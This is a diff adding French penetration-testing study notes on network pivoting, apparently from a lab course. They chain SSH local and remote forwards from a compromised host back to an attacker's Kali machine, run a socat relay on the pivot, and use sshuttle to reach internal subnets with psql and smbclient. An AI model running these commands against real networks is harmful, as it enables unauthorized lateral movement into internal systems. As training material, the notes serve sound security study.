@@ -179,3 +179,62 @@ socks5 127.0.0.1 9998
 # Scan Nmap via le proxy SOCKS
 proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
 ```
+
+## Chaînage de tunnels statiques (ailes de pigeon)
+
+Quand un seul saut ne suffit pas : combiner un local forward (pivot → machine interne) et un remote forward (pivot → Kali) pour ramener un port profondément enfoui jusqu'à Kali.
+
+**Flux :** `Kali:1234` ← remote tunnel ← `Pivot:4321` ← local tunnel ← `Machine B:5432`
+
+### Commandes à lancer sur la machine pivot
+
+```bash
+# 1. Local forward : écouter sur 0.0.0.0:4321, forwarder vers le port 5432 de la machine B
+ssh -f -N -L 0.0.0.0:4321:127.0.0.1:5432 database_admin@10.4.223.215
+
+# 2. Remote forward : ramener le port 4321 du pivot sur 127.0.0.1:1234 côté Kali
+ssh -f -N -R 127.0.0.1:1234:127.0.0.1:4321 kali@192.168.45.189
+```
+
+> L'ordre compte : créer le local forward en premier pour que le port 4321 existe avant que le remote forward tente de s'y connecter.
+
+### Utiliser le tunnel depuis Kali
+
+```bash
+psql -h 127.0.0.1 -p 1234 -U postgres
+```
+
+## sshuttle
+
+Transforme une connexion SSH en VPN léger : routes locales créées automatiquement sur Kali pour que tout le trafic vers les sous-réseaux cibles passe de façon transparente par le tunnel — pas besoin de Proxychains.
+
+**Prérequis :** root sur le client SSH (Kali) + Python3 sur le serveur SSH cible.
+
+### Mettre en place un accès SSH vers le réseau interne
+
+Si le serveur SSH interne n'est pas directement accessible, créer d'abord un pivot avec socat sur la machine compromise :
+
+```bash
+# Sur CONFLUENCE01 — forward le port 2222 vers SSH de PGDATABASE01
+socat TCP-LISTEN:2222,fork TCP:<IP_INTERNE>:22
+```
+
+### Lancer sshuttle depuis Kali
+
+```bash
+pipx install sshuttle
+sshuttle -r <user>@<IP_PIVOT>:<PORT> <SUBNET1> <SUBNET2> ...
+```
+
+```bash
+# Exemple : tunneler vers deux sous-réseaux via PGDATABASE01
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+```
+
+### Utiliser le tunnel
+
+Une fois connecté, toutes les commandes atteignent directement les hôtes des sous-réseaux cibles — sans proxychains ni port forwarding explicite :
+
+```bash
+smbclient -L //172.16.50.217/ -U hr_admin --password=<password>
+```
